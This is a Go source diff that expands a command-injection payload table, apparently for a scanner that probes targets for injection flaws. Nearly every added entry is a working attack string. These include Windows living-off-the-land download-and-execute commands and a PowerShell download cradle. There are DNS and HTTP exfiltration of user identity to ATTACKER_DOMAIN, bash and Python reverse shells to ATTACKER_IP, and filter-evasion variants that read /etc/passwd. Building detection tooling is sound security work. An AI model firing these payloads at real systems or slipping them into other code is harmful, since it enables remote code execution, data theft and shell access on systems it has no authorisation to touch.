@@ -74,6 +74,9 @@ func GetAllPayloads() []Payload {
 	all = append(all, bothPayloads...)
 	all = append(all, linuxPayloads...)
 	all = append(all, windowsPayloads...)
+	all = append(all, linuxBlindPayloads...)
+	all = append(all, linuxOOBPayloads...)
+	all = append(all, linuxBypassPayloads...)
 	return all
 }
 
@@ -185,4 +188,53 @@ var windowsPayloads = []Payload{
 	{Value: "&nslookup %USERNAME%.ATTACKER_DOMAIN", Platform: PlatformWindows, Type: TypeBlind, Description: "DNS exfil username"},
 	{Value: "&powershell Invoke-WebRequest http://ATTACKER_IP/$env:USERNAME", Platform: PlatformWindows, Type: TypeBlind, Description: "PS HTTP exfil"},
 	{Value: "&certutil -urlcache -f http://ATTACKER_IP/test test.txt", Platform: PlatformWindows, Type: TypeBlind, Description: "Certutil callback"},
+
+	// --- HackTricks LOLBAS expansion ---
+	{Value: "&bitsadmin /transfer myJob /download /priority normal http://ATTACKER_IP/x.exe %TEMP%\\x.exe", Platform: PlatformWindows, Type: TypeBlind, Description: "bitsadmin file fetch (LOLBAS)"},
+	{Value: "&mshta http://ATTACKER_IP/x.hta", Platform: PlatformWindows, Type: TypeBlind, Description: "mshta HTA execution"},
+	{Value: "&regsvr32 /s /u /n /i:http://ATTACKER_IP/x.sct scrobj.dll", Platform: PlatformWindows, Type: TypeBlind, Description: "regsvr32 squiblydoo"},
+	{Value: "&rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"calc\");", Platform: PlatformWindows, Type: TypeBlind, Description: "rundll32 JS RCE"},
+	{Value: "&powershell -enc dwBoAG8AYQBtAGkA", Platform: PlatformWindows, Type: TypeChained, Description: "PowerShell base64-encoded command", WAFBypass: true},
+	{Value: "&powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/x.ps1')\"", Platform: PlatformWindows, Type: TypeBlind, Description: "PowerShell download cradle"},
+	{Value: "&for /f %i in ('whoami') do nslookup %i.ATTACKER_DOMAIN", Platform: PlatformWindows, Type: TypeBlind, Description: "for-loop DNS exfil result"},
+}
+
+// --- HackTricks / PayloadAllTheThings advanced expansion ---
+
+// Time-based blind (Linux) — language-interpreter delays the existing
+// table doesn't cover, plus CPU-burn fallback for busybox containers
+// without sleep.
+var linuxBlindPayloads = []Payload{
+	{Value: "%0Asleep%205", Platform: PlatformLinux, Type: TypeTimeBased, Description: "URL-encoded newline sleep", WAFBypass: true},
+	{Value: ";python -c 'import time;time.sleep(5)'", Platform: PlatformLinux, Type: TypeTimeBased, Description: "Python sleep"},
+	{Value: ";perl -e 'sleep(5)'", Platform: PlatformLinux, Type: TypeTimeBased, Description: "Perl sleep"},
+	{Value: ";dd if=/dev/zero bs=1M count=512|md5sum", Platform: PlatformLinux, Type: TypeTimeBased, Description: "CPU-burn fallback (busybox)"},
+}
+
+// OOB exfil (Linux) — DNS-based exfil works through outbound-restricted
+// networks because DNS resolution traverses different paths than HTTP.
+// ATTACKER_DOMAIN is a placeholder the detector substitutes before
+// sending.
+var linuxOOBPayloads = []Payload{
+	{Value: ";nslookup -type=A $(whoami).ATTACKER_DOMAIN", Platform: PlatformLinux, Type: TypeBlind, Description: "DNS A-record exfil whoami"},
+	{Value: ";dig $(whoami).ATTACKER_DOMAIN", Platform: PlatformLinux, Type: TypeBlind, Description: "dig DNS exfil"},
+	{Value: ";host $(id|base64).ATTACKER_DOMAIN", Platform: PlatformLinux, Type: TypeBlind, Description: "host base64-id exfil"},
+	{Value: ";curl http://ATTACKER_DOMAIN/?u=$(whoami)", Platform: PlatformLinux, Type: TypeBlind, Description: "curl query-param exfil"},
+	{Value: ";wget http://ATTACKER_DOMAIN/$(id|base64)", Platform: PlatformLinux, Type: TypeBlind, Description: "wget exfil"},
+	{Value: ";bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1", Platform: PlatformLinux, Type: TypeBlind, Description: "Bash reverse shell"},
+	{Value: ";python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"sh\")'", Platform: PlatformLinux, Type: TypeBlind, Description: "Python reverse shell"},
+}
+
+// Modern bash WAF bypass — brace expansion, ANSI-C quoting,
+// process-substitution tricks documented on HackTricks's
+// "Bypass linux restrictions" page.
+var linuxBypassPayloads = []Payload{
+	{Value: ";{whoami,;id}", Platform: PlatformLinux, Type: TypeChained, Description: "Brace-expanded sequence (no space)", WAFBypass: true},
+	{Value: ";cat$'\\x20'/etc/passwd", Platform: PlatformLinux, Type: TypeChained, Description: "ANSI-C quoting space", WAFBypass: true},
+	{Value: ";cat<(echo /etc/passwd)", Platform: PlatformLinux, Type: TypeChained, Description: "Process substitution", WAFBypass: true},
+	{Value: ";c\"\"a\"\"t /etc/passwd", Platform: PlatformLinux, Type: TypeChained, Description: "Empty-quote concat", WAFBypass: true},
+	{Value: ";c''a''t /etc/passwd", Platform: PlatformLinux, Type: TypeChained, Description: "Empty single-quote concat", WAFBypass: true},
+	{Value: ";\\c\\a\\t /etc/passwd", Platform: PlatformLinux, Type: TypeChained, Description: "Backslash-prefixed letters", WAFBypass: true},
+	{Value: ";$0<<<id", Platform: PlatformLinux, Type: TypeDirect, Description: "$0 (shell name) here-string", WAFBypass: true},
+	{Value: ";bash -c {echo,Y2F0IC9ldGMvcGFzc3dk}|{base64,-d}|bash", Platform: PlatformLinux, Type: TypeDirect, Description: "Brace-expanded base64 pipe", WAFBypass: true},
 }
